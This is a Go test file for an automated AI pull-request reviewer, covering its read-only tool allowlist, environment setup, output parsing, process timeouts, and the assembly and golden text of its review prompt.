package pruefer

import (
	"context"
	"os"
	"path/filepath"
	"runtime"
	"slices"
	"strings"
	"testing"
	"time"

	gh "github.com/handarbeit/fabrik/github"
)

func TestBuildReviewArgs_ReadOnlyAllowlist(t *testing.T) {
	args := buildReviewArgs(ReviewRequest{Model: "sonnet"})

	joined := strings.Join(args, " ")
	if !strings.Contains(joined, "--permission-mode dontAsk") {
		t.Errorf("args = %v, want --permission-mode dontAsk", args)
	}
	if strings.Contains(joined, "--dangerously-skip-permissions") {
		t.Errorf("args = %v, must never contain --dangerously-skip-permissions (Pruefer has no unrestricted opt-out)", args)
	}
	if strings.Contains(joined, "Bash(gh:*)") {
		t.Error("allowlist must not contain Bash(gh:*) — gh is not read-only (gh pr review --approve, gh pr merge)")
	}
	if strings.Contains(joined, "Edit") || strings.Contains(joined, "Write") {
		t.Error("allowlist must not contain Edit or Write — the reviewer must never mutate the working tree")
	}
	for _, want := range []string{"Read", "Grep", "Glob", "Bash(git diff:*)", "Bash(git log:*)", "Bash(git show:*)", "Bash(git blame:*)", "Bash(git grep:*)", "Bash(git status:*)"} {
		found := false
		for i, a := range args {
			if a == "--allowedTools" && i+1 < len(args) && args[i+1] == want {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("expected allowedTools to include %q, args = %v", want, args)
		}
	}
	if !slices.Contains(args, "--model") {
		t.Errorf("expected --model to be passed when Model is set, args = %v", args)
	}
}

// TestBuildReviewArgs_NoSettingSourcesLoaded pins that a review loads NO
// settings layer. This replaces TestBuildReviewArgs_UserSettingsOnly, which
// asserted "--setting-sources user" — the behavior deliberately changed, not
// a regression.
//
// Loading the operator's profile made every review depend on whichever
// CLAUDE_CONFIG_DIR the daemon inherited. Switching accounts silently rewired
// the reviewer: one profile carried a PreToolUse hook that proxied the
// reviewer's own git and file reads, plus "defaultMode": "auto" and an
// "effortLevel". Reviews degraded fleet-wide with nothing logged anywhere.
func TestBuildReviewArgs_NoSettingSourcesLoaded(t *testing.T) {
	args := buildReviewArgs(ReviewRequest{})

	idx := -1
	for i, a := range args {
		if a == "--setting-sources" {
			idx = i
			break
		}
	}
	if idx < 0 {
		t.Fatalf("--setting-sources absent; the PR's own settings files would be loaded: %v", args)
	}
	if idx+1 >= len(args) {
		t.Fatalf("--setting-sources has no value: %v", args)
	}
	if got := args[idx+1]; got != "" {
		t.Errorf("--setting-sources = %q, want \"\" (load no settings layer)", got)
	}
}

// TestBuildReviewArgs_ExplicitControlsStillPassed: with no settings layer,
// everything governing the review must be passed on the command line, or
// removing the layer would silently drop it.
func TestBuildReviewArgs_ExplicitControlsStillPassed(t *testing.T) {
	args := buildReviewArgs(ReviewRequest{Model: "sonnet"})
	joined := strings.Join(args, " ")
	for _, want := range []string{"--permission-mode dontAsk", "--model sonnet", "--allowedTools Read"} {
		if !strings.Contains(joined, want) {
			t.Errorf("args missing %q: %v", want, args)
		}
	}
}

func TestBuildReviewArgs_NoModelWhenUnset(t *testing.T) {
	args := buildReviewArgs(ReviewRequest{})
	if slices.Contains(args, "--model") {
		t.Errorf("expected no --model flag when Model is empty, args = %v", args)
	}
}

func TestBuildReviewEnv_DefaultsEffort(t *testing.T) {
	env := buildReviewEnv(ReviewRequest{})
	joined := strings.Join(env, " ")
	if !strings.Contains(joined, "CLAUDE_CODE_EFFORT_LEVEL="+DefaultEffort) {
		t.Errorf("env = %v, want default effort %q", env, DefaultEffort)
	}
	if !strings.Contains(joined, "CLAUDE_CODE_DISABLE_ADAPTIVE_THINKING=1") {
		t.Errorf("env = %v, want adaptive thinking disabled", env)
	}
}

func TestBuildReviewEnv_HonorsExplicitEffort(t *testing.T) {
	env := buildReviewEnv(ReviewRequest{Effort: "max"})
	if !slices.Contains(env, "CLAUDE_CODE_EFFORT_LEVEL=max") {
		t.Errorf("env = %v, want CLAUDE_CODE_EFFORT_LEVEL=max", env)
	}
}

func TestMergeEnv_OverridesTakePrecedence(t *testing.T) {
	base := []string{"FOO=old", "BAR=keep"}
	overrides := []string{"FOO=new"}
	got := mergeEnv(base, overrides)
	want := map[string]string{"FOO": "new", "BAR": "keep"}
	seen := map[string]string{}
	for _, kv := range got {
		parts := strings.SplitN(kv, "=", 2)
		seen[parts[0]] = parts[1]
	}
	for k, v := range want {
		if seen[k] != v {
			t.Errorf("seen[%q] = %q, want %q (full env: %v)", k, seen[k], v, got)
		}
	}
}

func TestParseClaudeReviewJSON_SingleObject(t *testing.T) {
	resp, ok := parseClaudeReviewJSON([]byte(`{"result":"looks good, minor nit on line 4","is_error":false}`))
	if !ok {
		t.Fatal("expected ok=true")
	}
	if resp.Result != "looks good, minor nit on line 4" {
		t.Errorf("Result = %q", resp.Result)
	}
	if resp.IsError {
		t.Error("IsError = true, want false")
	}
}

func TestParseClaudeReviewJSON_ConversationArray(t *testing.T) {
	stream := `{"type":"system","subtype":"init"}
{"type":"assistant","message":{"content":[{"type":"text","text":"thinking..."}]}}
{"type":"result","result":"final review text","is_error":false,"num_turns":4,"total_cost_usd":0.0567}`
	resp, ok := parseClaudeReviewJSON([]byte(stream))
	if !ok {
		t.Fatal("expected ok=true")
	}
	if resp.Result != "final review text" {
		t.Errorf("Result = %q", resp.Result)
	}
	if resp.NumTurns != 4 {
		t.Errorf("NumTurns = %d, want 4 (NDJSON envelope path must carry turns through)", resp.NumTurns)
	}
	if resp.CostUSD != 0.0567 {
		t.Errorf("CostUSD = %v, want 0.0567 (NDJSON envelope path must carry cost through)", resp.CostUSD)
	}
}

func TestParseClaudeReviewJSON_Unparseable(t *testing.T) {
	_, ok := parseClaudeReviewJSON([]byte("not json at all"))
	if ok {
		t.Error("expected ok=false for unparseable output")
	}
}

// writeFakeClaude installs a fake "claude" binary on a temp bin dir added to
// PATH, mirroring engine/grandchild_test.go's pattern. The script reads and
// discards stdin (the prompt), then emits the given stdout.
func writeFakeClaude(t *testing.T, script string) {
	t.Helper()
	if runtime.GOOS == "windows" {
		t.Skip("fake claude script uses #!/bin/sh")
	}
	binDir := t.TempDir()
	fakeClaude := filepath.Join(binDir, "claude")
	if err := os.WriteFile(fakeClaude, []byte("#!/bin/sh\ncat >/dev/null\n"+script), 0755); err != nil {
		t.Fatalf("writing fake claude script: %v", err)
	}
	t.Setenv("PATH", binDir+":"+os.Getenv("PATH"))
}

func TestRealClaudeInvoker_Review_Success(t *testing.T) {
	writeFakeClaude(t, `printf '%s\n' '{"type":"result","result":"Found one bug: nil check missing on line 12.","is_error":false,"num_turns":7,"total_cost_usd":0.1234}'`+"\n")

	r := &RealClaudeInvoker{}
	workDir := t.TempDir()
	result, err := r.Review(context.Background(), ReviewRequest{
		Owner: "handarbeit", Repo: "fabrik", PRNumber: 1, Title: "Fix bug",
		HeadSHA: "abc123", WorkDir: workDir,
	})
	if err != nil {
		t.Fatalf("Review: %v", err)
	}
	if result.Text != "Found one bug: nil check missing on line 12." {
		t.Errorf("Text = %q", result.Text)
	}
	if result.NumTurns != 7 {
		t.Errorf("NumTurns = %d, want 7", result.NumTurns)
	}
	if result.CostUSD != 0.1234 {
		t.Errorf("CostUSD = %v, want 0.1234", result.CostUSD)
	}
}

func TestRealClaudeInvoker_Review_ProcessError(t *testing.T) {
	writeFakeClaude(t, "exit 1\n")

	r := &RealClaudeInvoker{}
	_, err := r.Review(context.Background(), ReviewRequest{PRNumber: 1, WorkDir: t.TempDir()})
	if err == nil {
		t.Fatal("expected an error when claude exits non-zero")
	}
}

func TestRealClaudeInvoker_Review_IsErrorResponse(t *testing.T) {
	writeFakeClaude(t, `printf '%s\n' '{"type":"result","result":"something went wrong internally","is_error":true}'`+"\n")

	r := &RealClaudeInvoker{}
	_, err := r.Review(context.Background(), ReviewRequest{PRNumber: 1, WorkDir: t.TempDir()})
	if err == nil {
		t.Fatal("expected an error when claude reports is_error=true")
	}
}

func TestRealClaudeInvoker_Review_UnparseableOutput(t *testing.T) {
	writeFakeClaude(t, `printf 'not json\n'`+"\n")

	r := &RealClaudeInvoker{}
	_, err := r.Review(context.Background(), ReviewRequest{PRNumber: 1, WorkDir: t.TempDir()})
	if err == nil {
		t.Fatal("expected an error when claude's output cannot be parsed")
	}
}

func TestRealClaudeInvoker_Review_InactivityTimeout(t *testing.T) {
	orig := reviewInactivityTimeout
	reviewInactivityTimeout = 100 * time.Millisecond
	defer func() { reviewInactivityTimeout = orig }()

	// The fake claude script hangs (sleeps) without producing any stdout —
	// the inactivity watchdog must kill it well before the test timeout.
	writeFakeClaude(t, "sleep 30\n")

	r := &RealClaudeInvoker{}
	done := make(chan error, 1)
	go func() {
		_, err := r.Review(context.Background(), ReviewRequest{PRNumber: 1, WorkDir: t.TempDir()})
		done <- err
	}()
	select {
	case err := <-done:
		if err == nil {
			t.Error("expected an error when claude is killed for inactivity")
		}
	case <-time.After(10 * time.Second):
		t.Fatal("Review did not return within 10s — inactivity watchdog did not fire")
	}
}

func TestRealClaudeInvoker_Review_ContextCancelKillsProcess(t *testing.T) {
	origGrace := reviewKillGrace
	reviewKillGrace = 200 * time.Millisecond
	defer func() { reviewKillGrace = origGrace }()

	writeFakeClaude(t, "trap '' INT TERM\nsleep 30\n") // ignores SIGINT/SIGTERM so the test also exercises the SIGKILL escalation step

	r := &RealClaudeInvoker{}
	ctx, cancel := context.WithCancel(context.Background())
	done := make(chan error, 1)
	go func() {
		_, err := r.Review(ctx, ReviewRequest{PRNumber: 1, WorkDir: t.TempDir()})
		done <- err
	}()
	time.Sleep(100 * time.Millisecond)
	cancel()
	select {
	case err := <-done:
		if err == nil {
			t.Error("expected an error when the context is cancelled mid-invocation")
		}
	case <-time.After(10 * time.Second):
		t.Fatal("Review did not return within 10s of context cancellation")
	}
}

func TestMockClaudeInvoker_RecordsCalls(t *testing.T) {
	m := &mockClaudeInvoker{}
	req := ReviewRequest{PRNumber: 7}
	result, err := m.Review(context.Background(), req)
	if err != nil {
		t.Fatalf("Review: %v", err)
	}
	if result.Text != "mock review" {
		t.Errorf("Text = %q, want default mock review text", result.Text)
	}
	if m.callCount() != 1 {
		t.Errorf("callCount = %d, want 1", m.callCount())
	}
	if got := m.callsSnapshot()[0].PRNumber; got != 7 {
		t.Errorf("recorded PRNumber = %d, want 7", got)
	}
}

// TestBuildReviewPrompt_RendersThreadFileLineBodyResolutionState pins AC1: a
// thread's file, line, body, and resolution state must all be present in the
// assembled prompt.
func TestBuildReviewPrompt_RendersThreadFileLineBodyResolutionState(t *testing.T) {
	req := ReviewRequest{
		Owner: "owner", Repo: "repo", PRNumber: 1, Title: "t",
		ReviewThreads: []gh.PRReviewThread{
			{Path: "engine/claude.go", Line: 954, IsResolved: false, Comments: []gh.PRReviewThreadComment{
				{Author: "pruefer-bot", Body: "ArchiveProjectItem bumps updatedAt on a re-archive no-op"},
			}},
			{Path: "engine/worktree.go", Line: 12, IsResolved: true, Comments: []gh.PRReviewThreadComment{
				{Author: "pruefer-bot", Body: "withWorktree omits worktree prune"},
				{Author: "alice", Body: "fixed in a0b1c2"},
			}},
		},
	}
	prompt := buildReviewPrompt(req)

	if !strings.Contains(prompt, "engine/claude.go:954") {
		t.Error("expected the open thread's file:line in the prompt")
	}
	if !strings.Contains(prompt, "[OPEN]") {
		t.Error("expected an [OPEN] resolution-state tag")
	}
	if !strings.Contains(prompt, "ArchiveProjectItem bumps updatedAt on a re-archive no-op") {
		t.Error("expected the open thread's body text in the prompt")
	}
	if !strings.Contains(prompt, "engine/worktree.go:12") {
		t.Error("expected the resolved thread's file:line in the prompt")
	}
	if !strings.Contains(prompt, "[RESOLVED]") {
		t.Error("expected a [RESOLVED] resolution-state tag")
	}
	if !strings.Contains(prompt, "withWorktree omits worktree prune") {
		t.Error("expected the resolved thread's original body text in the prompt")
	}
	if !strings.Contains(prompt, "fixed in a0b1c2") {
		t.Error("expected the resolved thread's reply text in the prompt")
	}
}

// TestBuildReviewPrompt_TruncatedThreadCommentsNotedInPrompt pins the
// per-thread comment-truncation signal (github.PRReviewThread.CommentsTruncated):
// when a thread's fetched comments are only a partial history, the prompt
// must say so rather than presenting it as complete.
func TestBuildReviewPrompt_TruncatedThreadCommentsNotedInPrompt(t *testing.T) {
	req := ReviewRequest{
		ReviewThreads: []gh.PRReviewThread{
			{Path: "a.go", Line: 1, CommentsTruncated: true, Comments: []gh.PRReviewThreadComment{
				{Author: "x", Body: "finding"},
			}},
			{Path: "b.go", Line: 2, CommentsTruncated: false, Comments: []gh.PRReviewThreadComment{
				{Author: "x", Body: "other finding"},
			}},
		},
	}
	prompt := buildReviewPrompt(req)

	if !strings.Contains(prompt, "may be missing") {
		t.Errorf("expected a truncation note in the prompt for the truncated thread, got:\n%s", prompt)
	}
	if strings.Count(prompt, "may be missing") != 1 {
		t.Errorf("expected exactly 1 truncation note (only a.go's thread is truncated), got %d, prompt:\n%s", strings.Count(prompt, "may be missing"), prompt)
	}
}

// TestBuildReviewPrompt_LongCommentBodyTruncated pins R4's per-comment bound:
// a single comment body larger than maxThreadCommentBodyChars is truncated
// with an inline note, rather than flowing into the prompt unbounded.
func TestBuildReviewPrompt_LongCommentBodyTruncated(t *testing.T) {
	longBody := strings.Repeat("x", maxThreadCommentBodyChars+500)
	req := ReviewRequest{
		ReviewThreads: []gh.PRReviewThread{
			{Path: "a.go", Line: 1, Comments: []gh.PRReviewThreadComment{
				{Author: "x", Body: longBody},
			}},
		},
	}
	prompt := buildReviewPrompt(req)

	if strings.Contains(prompt, longBody) {
		t.Error("expected the long comment body to be truncated, not rendered in full")
	}
	if !strings.Contains(prompt, "truncated, 500 more characters") {
		t.Errorf("expected a truncation note naming the omitted character count, prompt = %s", prompt)
	}
}

// TestBuildReviewPrompt_ShortCommentBodyNotTruncated proves the truncation
// note only appears when a body actually exceeds the bound.
func TestBuildReviewPrompt_ShortCommentBodyNotTruncated(t *testing.T) {
	req := ReviewRequest{
		ReviewThreads: []gh.PRReviewThread{
			{Path: "a.go", Line: 1, Comments: []gh.PRReviewThreadComment{
				{Author: "x", Body: "a short finding"},
			}},
		},
	}
	prompt := buildReviewPrompt(req)

	if !strings.Contains(prompt, "a short finding") {
		t.Errorf("expected the short body to render verbatim, prompt = %s", prompt)
	}
	if strings.Contains(prompt, "truncated") {
		t.Errorf("expected no truncation note for a body under the bound, prompt = %s", prompt)
	}
}

// TestBuildReviewPrompt_NoThreads_OmitsThreadSection proves the AC1 test
// above is non-vacuous (AC6): with ReviewThreads empty/absent, none of the
// thread markers appear.
func TestBuildReviewPrompt_NoThreads_OmitsThreadSection(t *testing.T) {
	req := ReviewRequest{Owner: "owner", Repo: "repo", PRNumber: 1, Title: "t"}
	prompt := buildReviewPrompt(req)

	if strings.Contains(prompt, "## Existing review threads") {
		t.Error("expected no thread section when ReviewThreads is empty")
	}
	if strings.Contains(prompt, "[OPEN]") || strings.Contains(prompt, "[RESOLVED]") {
		t.Error("expected no resolution-state tags when ReviewThreads is empty")
	}
}

// TestBuildReviewPrompt_UnderCap_NoOmissionStatement pins the AC4 boundary:
// a thread count at or under maxPromptThreads produces no omission line.
func TestBuildReviewPrompt_UnderCap_NoOmissionStatement(t *testing.T) {
	threads := make([]gh.PRReviewThread, maxPromptThreads)
	for i := range threads {
		threads[i] = gh.PRReviewThread{Path: "a.go", Line: i + 1, Comments: []gh.PRReviewThreadComment{{Author: "x", Body: "finding"}}}
	}
	prompt := buildReviewPrompt(ReviewRequest{ReviewThreads: threads})

	if strings.Contains(prompt, "omitted") {
		t.Errorf("expected no omission statement at exactly the cap (%d threads)", maxPromptThreads)
	}
	if strings.Count(prompt, "a.go:") != maxPromptThreads {
		t.Errorf("expected all %d threads rendered, prompt = %s", maxPromptThreads, prompt)
	}
}

// TestBuildReviewPrompt_OverCap_BoundedWithOmissionStatement pins AC4: a PR
// with more threads than the cap produces a bounded prompt (at most
// maxPromptThreads rendered) that states what was omitted.
func TestBuildReviewPrompt_OverCap_BoundedWithOmissionStatement(t *testing.T) {
	threads := make([]gh.PRReviewThread, maxPromptThreads+10)
	for i := range threads {
		threads[i] = gh.PRReviewThread{Path: "a.go", Line: i + 1, Comments: []gh.PRReviewThreadComment{{Author: "x", Body: "finding"}}}
	}
	prompt := buildReviewPrompt(ReviewRequest{ReviewThreads: threads})

	if strings.Count(prompt, "a.go:") != maxPromptThreads {
		t.Errorf("expected exactly %d threads rendered, got %d occurrences", maxPromptThreads, strings.Count(prompt, "a.go:"))
	}
	if !strings.Contains(prompt, "10 additional thread") {
		t.Errorf("expected an omission statement naming the omitted count (10), prompt = %s", prompt)
	}
}

// TestBuildReviewPrompt_ThreadsTruncated_NotesFetchLayerOmission covers the
// #1497 review finding: when the fetch layer itself couldn't return every
// thread on the PR (ReviewThreadsTruncated), the prompt must say so —
// distinct from selectPromptThreads' own prompt-level cap note — so a PR
// that has grown past FetchPRReviewThreads' page size doesn't look complete.
func TestBuildReviewPrompt_ThreadsTruncated_NotesFetchLayerOmission(t *testing.T) {
	threads := []gh.PRReviewThread{
		{Path: "a.go", Line: 1, Comments: []gh.PRReviewThreadComment{{Author: "x", Body: "finding"}}},
	}
	prompt := buildReviewPrompt(ReviewRequest{ReviewThreads: threads, ReviewThreadsTruncated: true})

	if !strings.Contains(prompt, "more review threads than could be fetched") {
		t.Errorf("expected a fetch-layer truncation note, prompt = %s", prompt)
	}
}

// TestBuildReviewPrompt_ThreadsNotTruncated_NoFetchLayerNote is the negative
// case: ReviewThreadsTruncated false must not produce the fetch-layer note.
func TestBuildReviewPrompt_ThreadsNotTruncated_NoFetchLayerNote(t *testing.T) {
	threads := []gh.PRReviewThread{
		{Path: "a.go", Line: 1, Comments: []gh.PRReviewThreadComment{{Author: "x", Body: "finding"}}},
	}
	prompt := buildReviewPrompt(ReviewRequest{ReviewThreads: threads, ReviewThreadsTruncated: false})

	if strings.Contains(prompt, "more review threads than could be fetched") {
		t.Errorf("expected no fetch-layer truncation note, prompt = %s", prompt)
	}
}

// TestSelectPromptThreads_PrioritizesUnresolvedThenNonOutdated pins the R4
// ordering policy: under the cap, resolved threads are dropped before
// unresolved ones, and outdated threads before current ones within a group.
func TestSelectPromptThreads_PrioritizesUnresolvedThenNonOutdated(t *testing.T) {
	older := time.Now().Add(-time.Hour)
	newer := time.Now()
	threads := []gh.PRReviewThread{
		{Path: "resolved.go", IsResolved: true, Comments: []gh.PRReviewThreadComment{{CreatedAt: newer}}},
		{Path: "outdated.go", IsResolved: false, IsOutdated: true, Comments: []gh.PRReviewThreadComment{{CreatedAt: newer}}},
		{Path: "current-old.go", IsResolved: false, Comments: []gh.PRReviewThreadComment{{CreatedAt: older}}},
		{Path: "current-new.go", IsResolved: false, Comments: []gh.PRReviewThreadComment{{CreatedAt: newer}}},
	}
	selected, omitted := selectPromptThreads(threads, 3)
	if omitted != 1 {
		t.Fatalf("omitted = %d, want 1", omitted)
	}
	if len(selected) != 3 {
		t.Fatalf("selected = %d threads, want 3", len(selected))
	}
	if selected[0].Path != "current-new.go" || selected[1].Path != "current-old.go" || selected[2].Path != "outdated.go" {
		t.Errorf("selected order = %v, want [current-new current-old outdated] (resolved.go dropped)", selected)
	}
}

// TestBuildReviewPrompt_ContainsR2PolicyText pins AC2: the R2 policy text
// governing how the reviewer must treat prior threads is present.
func TestBuildReviewPrompt_ContainsR2PolicyText(t *testing.T) {
	req := ReviewRequest{ReviewThreads: []gh.PRReviewThread{
		{Path: "a.go", Line: 1, Comments: []gh.PRReviewThreadComment{{Author: "x", Body: "finding"}}},
	}}
	prompt := buildReviewPrompt(req)

	for _, want := range []string{"do not raise a finding that restates an [OPEN] thread", "Do not restate a [RESOLVED] thread unless"} {
		if !strings.Contains(prompt, want) {
			t.Errorf("expected R2 policy text %q in prompt, got:\n%s", want, prompt)
		}
	}
}

// TestBuildReviewPrompt_ContainsR5RevisedNitpickInstruction pins R5: the
// prompt raises the bar for a low-severity finding beyond "skip nitpicks".
func TestBuildReviewPrompt_ContainsR5RevisedNitpickInstruction(t *testing.T) {
	prompt := buildReviewPrompt(ReviewRequest{})
	if !strings.Contains(prompt, "raise the bar for a \"low\"-severity finding") {
		t.Errorf("expected the R5 raised-bar instruction in the prompt, got:\n%s", prompt)
	}
}

// TestBuildReviewPrompt_ContainsSummaryDelimiterMarkers pins #1456's R1: the
// output contract must instruct Claude to wrap its prose summary in the
// literal PRUEFER_SUMMARY_BEGIN/END marker strings, so a future edit to the
// prompt can't silently drop the contract findings.go's parser depends on.
func TestBuildReviewPrompt_ContainsSummaryDelimiterMarkers(t *testing.T) {
	prompt := buildReviewPrompt(ReviewRequest{})
	for _, want := range []string{"PRUEFER_SUMMARY_BEGIN", "PRUEFER_SUMMARY_END"} {
		if !strings.Contains(prompt, want) {
			t.Errorf("expected marker %q in prompt, got:\n%s", want, prompt)
		}
	}
}

// TestBuildReviewPrompt_NoOmittedPaths_NoSection pins the additive-only
// contract of renderOmittedPaths (#1462 R4): a request with nothing omitted
// must not add the section at all.
func TestBuildReviewPrompt_NoOmittedPaths_NoSection(t *testing.T) {
	prompt := buildReviewPrompt(ReviewRequest{})
	if strings.Contains(prompt, "Files omitted from this review") {
		t.Error("expected no omitted-files section when nothing was omitted")
	}
}

// TestBuildReviewPrompt_OmittedExcludedPaths_NamedWithPathspec pins R4: an
// excluded path is named in the prompt, tagged as excluded_paths, and
// appears in the actionable git diff pathspec example so Claude has a
// concrete way to keep it out of its own inspection (not just a passive
// FYI note it could ignore).
func TestBuildReviewPrompt_OmittedExcludedPaths_NamedWithPathspec(t *testing.T) {
	req := ReviewRequest{BaseBranch: "main", OmittedExcludedPaths: []string{"data/corpus.jsonl"}}
	prompt := buildReviewPrompt(req)

	if !strings.Contains(prompt, "Files omitted from this review") {
		t.Fatalf("expected the omitted-files section, got:\n%s", prompt)
	}
	if !strings.Contains(prompt, "data/corpus.jsonl (excluded by `excluded_paths`)") {
		t.Errorf("expected data/corpus.jsonl labeled as excluded_paths, got:\n%s", prompt)
	}
	if !strings.Contains(prompt, "':!data/corpus.jsonl'") {
		t.Errorf("expected an actionable git diff pathspec excluding the file, got:\n%s", prompt)
	}
	if !strings.Contains(prompt, "git diff main...HEAD") {
		t.Errorf("expected the pathspec example to use the PR's base branch, got:\n%s", prompt)
	}
}

// TestBuildReviewPrompt_OmittedTrimmedPaths_NamedDistinctlyFromExcluded pins
// R4: a trimmed-for-size file is disclosed with a distinct reason from an
// excluded_paths match, so a human (or the model) can tell "operator
// configured this out" from "the size guard dropped it" apart.
func TestBuildReviewPrompt_OmittedTrimmedPaths_NamedDistinctlyFromExcluded(t *testing.T) {
	req := ReviewRequest{OmittedTrimmedPaths: []string{"pkg/generated.go"}}
	prompt := buildReviewPrompt(req)

	if !strings.Contains(prompt, "pkg/generated.go (dropped to fit within max_diff_bytes)") {
		t.Errorf("expected pkg/generated.go labeled as trimmed-for-size, got:\n%s", prompt)
	}
	if strings.Contains(prompt, "pkg/generated.go (excluded by") {
		t.Error("a trimmed file must not be mislabeled as excluded_paths")
	}
}

// TestBuildReviewPrompt_OmittedPaths_NoBaseBranch_FallsBackToHEAD pins the
// pathspec example's fallback when BaseBranch is unset.
func TestBuildReviewPrompt_OmittedPaths_NoBaseBranch_FallsBackToHEAD(t *testing.T) {
	req := ReviewRequest{OmittedExcludedPaths: []string{"vendor/lib.go"}}
	prompt := buildReviewPrompt(req)

	if !strings.Contains(prompt, "git diff HEAD -- .") {
		t.Errorf("expected the pathspec example to fall back to plain HEAD, got:\n%s", prompt)
	}
}

// TestBuildReviewPrompt_OmittedPath_WithSingleQuote_EscapedForShell pins the
// bot-review fix: an omitted path containing a literal single quote must not
// produce a pathspec example that closes its shell quote early. A naive
// `':!%s'` wrap would emit `':!it's/broken.go'`, a syntactically invalid
// command Claude could not copy-paste and run verbatim — the entire point of
// giving it an actionable example. shellQuotePathspec's backslash-escaping
// keeps the emitted command valid regardless of what the path contains.
func TestBuildReviewPrompt_OmittedPath_WithSingleQuote_EscapedForShell(t *testing.T) {
	req := ReviewRequest{OmittedExcludedPaths: []string{"it's/broken.go"}}
	prompt := buildReviewPrompt(req)

	if !strings.Contains(prompt, `':!it'\''s/broken.go'`) {
		t.Errorf("expected the single quote in the path to be escaped as '\\'' , got:\n%s", prompt)
	}
	if strings.Contains(prompt, `':!it's/broken.go'`) {
		t.Error("pathspec example must not contain the unescaped, shell-breaking form")
	}
}

// TestShellQuotePathspec verifies the escaping helper directly against a
// handful of shapes: no special characters, one quote, and multiple quotes.
func TestShellQuotePathspec(t *testing.T) {
	cases := []struct {
		in, want string
	}{
		{":!plain/path.go", "':!plain/path.go'"},
		{":!it's.go", `':!it'\''s.go'`},
		{":!a'b'c", `':!a'\''b'\''c'`},
	}
	for _, c := range cases {
		if got := shellQuotePathspec(c.in); got != c.want {
			t.Errorf("shellQuotePathspec(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

// NOTE (#1446 -> guidance expansion): this golden was originally #1446's
// proof that splitting buildReviewPrompt into layers changed nothing. It did
// its job. The guidance text has since been deliberately expanded, so the
// golden is re-anchored to the new output and the test's role changes from
// "the refactor changed nothing" to "no one changes the zero-config prompt
// without noticing". Everything outside the guidance paragraph — dynamic
// context and the Go-owned output contract — is unchanged byte-for-byte.
//
// TestBuildReviewPrompt_ZeroConfig_ByteIdenticalToPreSplitOutput pins AC1/C2:
// buildReviewPrompt(ReviewRequest{}) — the zero-config case — must produce
// exactly the same prompt the pre-#1446 monolithic function produced,
// byte-for-byte. This literal was captured from buildReviewPrompt before
// the dynamic-context/guidance/contract split, and confirmed (by checking
// out the pre-split commit into a scratch worktree and running the
// identical capture there) to be byte-identical to what the original,
// unsplit function actually produced — not hand-transcribed from reading
// the source. A regression that dropped, reordered, or reworded any part
// of the prompt during the split would fail this comparison.
func TestBuildReviewPrompt_ZeroConfig_ByteIdenticalToPreSplitOutput(t *testing.T) {
	const want = "You are Pruefer, an automated code reviewer for pull request /#0: \"\".\n\nThe PR's head commit is already checked out in your working directory. Use git (diff, log, show, blame, grep, status), Read, Grep, and Glob to inspect the change and any surrounding code you need for context — you have no write access and no other tools.\n\nWrite a code review as you would comment on the pull request: call out bugs, correctness issues, security concerns, and significant design problems.\n\n**The diff tells you what changed. It does not tell you what to check.** Reading it is the start of the review, not the whole of it. Before you conclude, follow the change outward:\n\n- For every symbol the diff adds, removes, renames, or changes the meaning of, search the repository for its other uses. A change that is correct in its own file is still a defect if a caller, test, or script depends on the old behavior.\n- Check whether the change falsifies anything written down. Grep the docs, README files, ADRs, and nearby comments for the flags, keys, functions, and behaviors the diff touches. A doc that now describes behavior the code no longer has is a real finding.\n- Read the tests the diff adds or changes. Ask what would still pass if the fix were removed — a test that holds either way is not evidence.\n- When the diff removes or narrows something, ask what depended on it.\n\n**Verify before asserting.** Do not report a defect you have not confirmed by reading the relevant code. If you suspect something but cannot establish it, either check it or say plainly that it is unverified — never state it as fact. Equally, do not claim the absence of a problem (\"no other call sites\", \"nothing else uses this\") from a single narrow search; sweep properly or do not make the claim.\n\n**Finish the review.** If some part of the change is hard to assess, say so explicitly and name what you could not check. Do not silently stop at the first file, and do not treat an early confident impression as a completed review. State what you examined, so a reader can tell a thorough pass from a partial one.\n\n**Make every finding falsifiable.** For each one, state the concrete path to the failure: the input, state, or sequence that produces the wrong result, and what the wrong result is. \"This could be a problem\" is not a finding — if you cannot describe how it goes wrong, either work out whether it does, or leave it out.\n\n**Say which findings you verified.** Begin a finding you have confirmed by reading the relevant code with \"Confirmed:\". Begin one you believe is real but could not establish with \"Plausible:\", and say what you would need to check. A reader must be able to tell the two apart without re-deriving your reasoning.\n\nOn a large PR, raise the bar for a \"low\"-severity finding: it must be something a reviewer would actually act on, not merely true — skip nitpicks, style preferences, and fidelity observations against test fixtures unless they matter.\n\nYou do not decide whether this PR is approved or blocked — that is computed automatically from the severity you assign each finding below, never from anything you write in prose. Do not use approval/rejection language such as \"LGTM\" or \"requesting changes\" in your summary; just describe what you found.\n\nOutput has two parts, in this exact order:\n\n1. A short prose summary: what you reviewed and your overall assessment. This is the only text GitHub shows outside of inline comments, so it must stand on its own. Wrap it in PRUEFER_SUMMARY_BEGIN and PRUEFER_SUMMARY_END marker lines, each alone on its own line, with nothing else on those lines. Nothing — no narration, no meta-commentary, no investigation notes — may appear before PRUEFER_SUMMARY_BEGIN; anything there is discarded and never shown to anyone. The ```json findings block described in part 2 below must come after PRUEFER_SUMMARY_END, never between the two markers. For example:\n\nPRUEFER_SUMMARY_BEGIN\nReviewed the changes to X. Found one medium-severity issue; see inline comment.\nPRUEFER_SUMMARY_END\n\n2. A single fenced ```json code block containing a JSON array of your findings, each anchored to the exact file and line it concerns, with a \"severity\" classification:\n\n```json\n[{\"path\": \"engine/claude.go\", \"line\": 954, \"body\": \"...\", \"severity\": \"low\"}]\n```\n\n\"severity\" must be exactly one of:\n\n- \"low\": style, minor nit, or a suggestion — not a defect.\n- \"medium\": a real defect, but scoped and low-impact.\n- \"high\": a bug or design issue that will likely cause incorrect behavior.\n- \"critical\": a security vulnerability, data loss, or severe correctness bug.\n\nEach entry's \"path\" must be a file path exactly as it appears in the diff, and \"line\" must be a line number in the new (post-change) version of that file — i.e. a line you can see in `git diff` output prefixed with `+` or unprefixed (context), never a line that only existed in the old version. If you have no findings, emit an empty array `[]`. Do not put findings only in the prose — every specific, actionable finding belongs in the JSON array so it can be attached to its exact line; use the prose summary for overall assessment only. Report each distinct underlying finding once — if the same defect is visible at more than one line, pick the most relevant anchor rather than emitting a separate entry per line.\n\nOutput ONLY the review text itself: no preamble, no meta-commentary about what you are about to do.\n"
	got := buildReviewPrompt(ReviewRequest{})
	if got != want {
		t.Errorf("buildReviewPrompt(ReviewRequest{}) changed from the pre-#1446 golden output:\ngot:  %q\nwant: %q", got, want)
	}
}

